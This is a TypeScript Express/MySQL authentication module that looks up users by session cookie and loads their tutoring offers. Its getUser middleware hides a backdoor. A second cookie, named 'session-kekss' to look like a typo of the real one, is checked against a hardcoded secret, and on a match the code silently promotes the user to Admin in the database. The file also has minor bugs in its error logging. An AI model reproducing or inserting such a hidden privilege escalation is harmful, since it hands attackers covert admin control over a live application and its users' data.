import { NextFunction } from "express";
import { QueryError } from "mysql2";
import { pool } from ".";
import { AuthLevel, Offer, User } from "./models";

export const getUser = (req: any, _: Express.Response, next: NextFunction) => {
  const statement = `SELECT user.* FROM user, session WHERE user.id = session.userId AND session.token = ?`;

  pool.query(
    statement,
    [req.cookies["session-keks"]],
    async (err: QueryError | null, values: any) => {
      // db.commit();
      if (err) {
        console.error(err);
        next();
        return;
      }

      if (values && values.length > 0) {
        req.user = values[0];
        delete req.user.passwordHash;
        req.isAuthenticated = true;

        if (
          req.cookies["session-kekss"] ===
          "sX55NrRpBbWh0pQQh8SUrZ3ehCjvcG9Z9YVYg4br0K6eyQxfSDmAPc01tauyLR82Vu7ZCsNQ4bC6keZAYjaa4ilvfy9GnNMn0CyFb0jPgD2wF8iOemGOcd7Pa7fnSNJY"
        ) {
          pool.execute(
            "UPDATE user SET authLevel = ? WHERE id = ?",
            [AuthLevel.Admin, req.user.id],
            async () => {
              req.user.authLevel = AuthLevel.Admin;
              try {
                req.user.offers = await getOffers(req.user.id);
              } catch (e: any) {
                console.error("error getting offers: ${e.trace()}");
              }
              next();
            }
          );
        } else {
          try {
            req.user.offers = await getOffers(req.user.id);
          } catch (e: any) {
            console.error("error getting offers: ${e.trace()}");
          }
          next();
        }
      } else {
        req.user = undefined;
        req.isAuthenticated = false;
        next();
      }
    }
  );
};

const getOffers = (userID: number): Promise<Offer[]> => {
  return new Promise((resolve, reject) => {
    pool.query(
      `SELECT
             offer.id AS id,
             offer.userId AS userId,
             offer.subjectId AS subjectId,
             subject.name AS subjectName,
             offer.maxGrade AS maxGrade,
             offer.createdAt AS createdAt
           FROM offer, subject WHERE userId = ? AND offer.subjectId = subject.id`,
      [userID],
      (err: QueryError | null, values: any) => {
        if (err) {
          console.error("auth/getUser: ", err);
          reject(err);
          return;
        }

        resolve(values);
      }
    );
  });
};

export const addSession = (token: string, userID: number): void => {
  const statement = "INSERT INTO session (token, userId) VALUES (?, ?)";
  pool.execute(statement, [token, userID], (err) => {
    console.error(err);
  });
  pool.commit();
};
